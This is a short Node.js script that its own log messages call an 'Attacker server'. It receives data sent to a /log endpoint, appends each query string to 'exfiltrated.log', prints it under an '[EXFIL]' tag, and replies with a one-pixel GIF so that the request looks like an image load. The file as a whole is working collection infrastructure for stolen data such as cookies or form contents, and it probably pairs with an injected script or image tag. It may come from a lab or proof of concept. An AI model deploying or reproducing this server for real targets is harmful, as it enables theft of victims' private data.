const http = require('http');
const url = require('url');
const fs = require('fs');

const logFile = 'exfiltrated.log';

const server = http.createServer((req, res) => {

    const parsed = url.parse(req.url, true);

    if (req.url.startsWith('/log')) {

        const data = parsed.query;
        const logEntry = new Date().toISOString() + ' | ' + JSON.stringify(data) + '\n';

        fs.appendFileSync(logFile, logEntry);
        console.log('[EXFIL]', data);

        res.writeHead(200, { 'Content-Type': 'image/gif' });
        res.end(Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64'));
        return;

    }

    res.writeHead(404);
    res.end();

});

server.listen(8080, () => {
    console.log('Attacker server running on port 8080');
    console.log('Exfiltrated data will be logged to exfiltrated.log');
});
